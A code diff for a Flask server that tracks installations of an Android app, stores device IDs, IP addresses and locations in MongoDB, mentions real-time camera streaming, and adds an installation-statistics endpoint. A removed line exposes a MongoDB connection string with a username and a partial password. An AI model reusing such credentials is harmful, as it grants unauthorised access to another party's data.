@@ -1,7 +1,7 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from pymongo import MongoClient
-from datetime import datetime
+from datetime import datetime, timezone
 import json
 import os
 import time
@@ -9,16 +9,17 @@ import uuid
 from bson import ObjectId
 import logging
 import threading
+import config
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-CORS(app, origins="*", supports_credentials=True)
+CORS(app, origins=config.CORS_ORIGINS, supports_credentials=config.CORS_SUPPORTS_CREDENTIALS)
 
 # Check if we're running on Vercel (serverless environment)
-IS_VERCEL = os.getenv('VERCEL') == '1'
+IS_VERCEL = config.IS_VERCEL
 
 # Initialize socketio and related functions as None by default
 socketio = None
@@ -33,18 +34,18 @@ if not IS_VERCEL:
         # Configure SocketIO with better production settings
         socketio = SocketIO(
             app, 
-            cors_allowed_origins="*",
+            cors_allowed_origins=config.SOCKETIO_CORS_ORIGINS,
             logger=True,
             engineio_logger=True,
-            ping_timeout=60,
-            ping_interval=25,
-            max_http_buffer_size=1000000  # 1MB buffer for WebRTC data
+            ping_timeout=config.SOCKETIO_PING_TIMEOUT,
+            ping_interval=config.SOCKETIO_PING_INTERVAL,
+            max_http_buffer_size=config.SOCKETIO_MAX_HTTP_BUFFER_SIZE
         )
     except ImportError:
         pass  # SocketIO not available, websocket features disabled
 
 # MongoDB connection
-MONGODB_URI = "mongodb+srv://hussnainrajpoot5415:123456...@blogsdb.9xfkjee.mongodb.net/?retryWrites=true&w=majority&appName=blogsdb"
+MONGODB_URI = config.MONGODB_URI
 
 # Global variables for MongoDB
 client = None
@@ -77,8 +78,8 @@ def init_mongodb_async():
         )
         # Test the connection
         client.admin.command('ping')
-        db = client['lovebite']
-        installations_collection = db['apk_installations']
+        db = client[config.DB_NAME]
+        installations_collection = db[config.COLLECTION_NAME]
         mongodb_connected = True
         logger.info("✅ Connected to MongoDB successfully!")
         print("✅ Connected to MongoDB successfully!")
@@ -126,7 +127,7 @@ def home():
         "status": "healthy",
         "version": "1.0.0",
         "mongodb": "connected" if mongodb_connected else "connecting",
-        "timestamp": datetime.utcnow().isoformat()
+        "timestamp": datetime.now(timezone.utc).isoformat()
     })
 
 @app.route('/health')
@@ -134,7 +135,7 @@ def health():
     """FAST health check endpoint for Railway - NO DATABASE CHECKS"""
     return jsonify({
         "status": "healthy",
-        "timestamp": datetime.utcnow().isoformat()
+        "timestamp": datetime.now(timezone.utc).isoformat()
     }), 200
 
 @app.route('/api/status')
@@ -143,9 +144,9 @@ def detailed_status():
     return jsonify({
         "status": "healthy",
         "mongodb": "connected" if mongodb_connected else "connecting",
-        "port": os.getenv('PORT', '8080'),
+        "port": os.getenv('PORT', str(config.DEFAULT_PORT)),
         "environment": os.getenv('RAILWAY_ENVIRONMENT', 'local'),
-        "timestamp": datetime.utcnow().isoformat()
+        "timestamp": datetime.now(timezone.utc).isoformat()
     })
 
 @app.route('/admin_dashboard.html')
@@ -185,14 +186,14 @@ def track_installation():
             "device_id": data['device_id'],
             "app_version": data['app_version'],
             "device_info": data['device_info'],
-            "installation_time": datetime.utcnow(),
+            "installation_time": datetime.now(timezone.utc),
             "ip_address": request.remote_addr,
             "user_agent": request.headers.get('User-Agent', ''),
             "country": data.get('country', 'Unknown'),
             "city": data.get('city', 'Unknown'),
             "timezone": data.get('timezone', 'Unknown'),
             "is_active": True,
-            "last_seen": datetime.utcnow()
+            "last_seen": datetime.now(timezone.utc)
         }
         
         if mongodb_connected and installations_collection is not None:
@@ -204,7 +205,7 @@ def track_installation():
                     {"device_id": data['device_id']},
                     {
                         "$set": {
-                            "last_seen": datetime.utcnow(),
+                            "last_seen": datetime.now(timezone.utc),
                             "is_active": True,
                             "app_version": data['app_version'],
                             "device_info": data['device_info']
@@ -221,7 +222,7 @@ def track_installation():
             
             if existing_device:
                 existing_device.update({
-                    "last_seen": datetime.utcnow(),
+                    "last_seen": datetime.now(timezone.utc),
                     "is_active": True,
                     "app_version": data['app_version'],
                     "device_info": data['device_info']
@@ -305,6 +306,68 @@ def get_installations():
             "error": str(e)
         }), 500
 
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
+    """Get installation statistics"""
+    try:
+        if mongodb_connected and installations_collection is not None:
+            # Get total installations
+            total_installations = installations_collection.count_documents({})
+            
+            # Get active installations
+            active_installations = installations_collection.count_documents({"is_active": True})
+            
+            # Get country stats
+            country_pipeline = [
+                {"$group": {"_id": "$country", "count": {"$sum": 1}}},
+                {"$sort": {"count": -1}},
+                {"$limit": 10}
+            ]
+            country_stats = list(installations_collection.aggregate(country_pipeline))
+            
+            # Get version stats
+            version_pipeline = [
+                {"$group": {"_id": "$app_version", "count": {"$sum": 1}}},
+                {"$sort": {"count": -1}},
+                {"$limit": 10}
+            ]
+            version_stats = list(installations_collection.aggregate(version_pipeline))
+            
+        else:
+            # Use in-memory storage
+            total_installations = len(in_memory_storage)
+            active_installations = len([d for d in in_memory_storage if d.get('is_active', True)])
+            
+            # Country stats from in-memory
+            country_counts = {}
+            version_counts = {}
+            
+            for installation in in_memory_storage:
+                country = installation.get('country', 'Unknown')
+                version = installation.get('app_version', 'Unknown')
+                
+                country_counts[country] = country_counts.get(country, 0) + 1
+                version_counts[version] = version_counts.get(version, 0) + 1
+            
+            country_stats = [{"_id": country, "count": count} for country, count in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:10]]
+            version_stats = [{"_id": version, "count": count} for version, count in sorted(version_counts.items(), key=lambda x: x[1], reverse=True)[:10]]
+        
+        return jsonify({
+            "success": True,
+            "stats": {
+                "total_installations": total_installations,
+                "active_installations": active_installations,
+                "country_stats": country_stats,
+                "version_stats": version_stats
+            }
+        })
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
 # WebSocket Event Handlers (only available when SocketIO is enabled)
 if socketio:
     @socketio.on('connect')
@@ -339,16 +402,16 @@ if __name__ == '__main__':
     if IS_VERCEL:
         print("🔧 Running on Vercel - WebSocket features disabled")
         # For Vercel, just run the Flask app without SocketIO
-        app.run(host='0.0.0.0', port=int(os.getenv('PORT', '8080')), debug=False)
+        app.run(host=config.HOST, port=int(os.getenv('PORT', str(config.DEFAULT_PORT))), debug=False)
     elif socketio:
         print("🌐 WebSocket enabled for real-time camera streaming")
         socketio.run(
             app, 
-            host='0.0.0.0', 
-            port=int(os.getenv('PORT', '8080')),
+            host=config.HOST, 
+            port=int(os.getenv('PORT', str(config.DEFAULT_PORT))),
             debug=False, 
             allow_unsafe_werkzeug=True
         )
     else:
         print("⚠️  WebSocket features disabled - Flask-SocketIO not available")
-        app.run(host='0.0.0.0', port=int(os.getenv('PORT', '8080')), debug=False)
+        app.run(host=config.HOST, port=int(os.getenv('PORT', str(config.DEFAULT_PORT))), debug=False)
